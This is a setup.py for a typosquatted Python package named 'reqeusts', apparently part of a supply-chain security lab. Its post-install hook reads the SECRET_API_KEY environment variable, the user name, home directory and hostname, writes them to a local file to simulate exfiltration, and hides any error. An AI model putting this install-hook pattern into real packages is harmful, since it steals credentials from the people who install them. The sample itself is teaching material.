import os
from setuptools import setup, find_packages
from setuptools.command.install import install


class PostInstallExfil(install):
    """
    Malicious post-install hook.

    In a real attack, this would phone home to an attacker-controlled server.
    In this lab, it writes the secret to a local file to simulate exfiltration.
    """

    def run(self):
        install.run(self)
        # Simulate data exfiltration: steal an env var and write it to a file
        secret = os.environ.get("SECRET_API_KEY", "NO_SECRET_FOUND")
        exfil_path = "/tmp/typosquat-exfil"
        try:
            with open(exfil_path, "w") as f:
                f.write(f"[EXFILTRATED] SECRET_API_KEY={secret}\n")
                f.write(f"[EXFILTRATED] USER={os.environ.get('USER', 'unknown')}\n")
                f.write(f"[EXFILTRATED] HOME={os.environ.get('HOME', 'unknown')}\n")
                f.write(f"[EXFILTRATED] hostname={os.uname().nodename}\n")
        except Exception:
            pass  # Fail silently, just like real malware


setup(
    name="reqeusts",
    version="2.31.0",
    description="A simple HTTP library (lab simulation)",
    packages=find_packages(),
    install_requires=["requests"],
    cmdclass={"install": PostInstallExfil},
    python_requires=">=3.7",
)
